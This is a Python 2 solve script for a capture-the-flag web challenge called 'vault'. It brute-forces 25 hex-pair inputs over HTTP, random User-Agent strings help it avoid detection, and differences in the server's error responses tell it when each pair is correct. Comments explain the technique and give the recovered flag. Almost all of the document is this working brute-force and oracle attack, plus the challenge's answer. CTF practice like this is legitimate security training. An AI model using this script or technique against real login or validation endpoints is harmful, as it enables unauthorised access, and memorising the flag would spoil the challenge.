import itertools
import requests
import random
import string
import time

url = "http://vault.problem.sctf.io/"
hexx = "abcdef0123456789"
data = {}

def random_useragent():
    return "".join([random.choice(string.ascii_letters) for x in range(100)])

def query(post):
    response = requests.post(url, data=post, headers={"User-Agent": random_useragent()})
    return response

correct = []

data["submit"] = "Open!"
for x in range(25):
    print "Cracking input%s" % x
    data["input%s" % x] = "z" # To throw odd length string error
    for y in itertools.product(hexx, repeat=2):
        candidate = "".join(list(y))
        data["input%s" % x] = candidate
        time.sleep(0.1)
        response = query(data)
        response.raise_for_status()
        text = response.text.lower()
        if "hex" in text or "incorrect" not in text:
            # Error thrown! That means that input is correct
            print "Cracked input%s!" % x
            print text
            correct.append(candidate)
            print correct
            break

print "flag{%s}" % "".join([x.decode("hex") for x in correct])

# Playing around with the inputs shows that the each input has to be even in length, and
# must be valid hex. Additionally, it runs ord() on our input, but only after it decodes
# it to hex. We also know by trying to throw an error with another input that the server
# checks each input one by one, before trying to evaluate the following ones. Knowing this,
# we can brute force the flag.

# At the end, it tells us that the flag is flag{<ascii password you just entered>}

# flag{HIIVDpLbHbdSIMKMdzuLJZzVh}
